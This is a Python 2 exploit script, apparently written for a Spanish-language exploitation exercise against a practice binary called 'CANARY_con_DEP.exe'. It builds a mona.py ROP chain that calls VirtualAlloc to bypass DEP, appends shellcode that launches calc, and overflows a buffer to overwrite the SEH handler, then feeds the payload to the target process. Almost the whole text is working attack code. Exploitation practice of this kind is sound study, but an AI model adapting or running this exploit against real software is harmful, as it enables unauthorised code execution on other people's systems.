from os import *
import struct

def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
        0x7801eb94,  # POP EBP # RETN [Mypepe.dll]
        0x7801eb94,  # skip 4 bytes [Mypepe.dll]
        0x7801ee74,  # POP EBX # RETN [Mypepe.dll]
        0x00000001,  # 0x00000001-> ebx
        0x7802920e,  # POP EDX # RETN [Mypepe.dll]
        0x00001000,  # 0x00001000-> edx
        0x7800a849,  # POP ECX # RETN [Mypepe.dll]
        0x00000040,  # 0x00000040-> ecx
        0x78028756,  # POP EDI # RETN [Mypepe.dll]
        0x7800b281,  # RETN (ROP NOP) [Mypepe.dll]
        0x78001492,  # POP ESI # RETN [Mypepe.dll]
        0x780041ed,  # JMP [EAX] [Mypepe.dll]
        0x78013953,  # POP EAX # RETN [Mypepe.dll]
        0x7802e030,  # ptr to &VirtualAlloc() [IAT Mypepe.dll]
        0x78009791,  # PUSHAD # ADD AL,80 # RETN [Mypepe.dll]
        0x7800f7c1,  # ptr to 'push esp # ret ' [Mypepe.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)


shellcode ="\xB8\x40\x50\x03\x78\xC7\x40\x04"+ "calc" + "\x83\xC0\x04\x50\x68\x24\x98\x01\x78\x59\xFF\xD1\x68\xAB\x39\x00\x78\xC3"

stdin,stdout = popen4(r'CANARY_con_DEP.exe -1')
print "ATACHEA EL DEBUGGER Y APRETA ENTER\n"
raw_input()

rop= create_rop_chain()

next="\x41\x41\x41\x41"
seh=struct.pack("<L", 0x7802d415)

data=(0xec) * "A" + rop + shellcode


fruta = data +  ((844-len(data)) * "A" )+ next + seh + 6000 * "A" + "\n"

print stdin
print "Escribe: " + fruta
stdin.write(fruta)
print stdout.read(40)

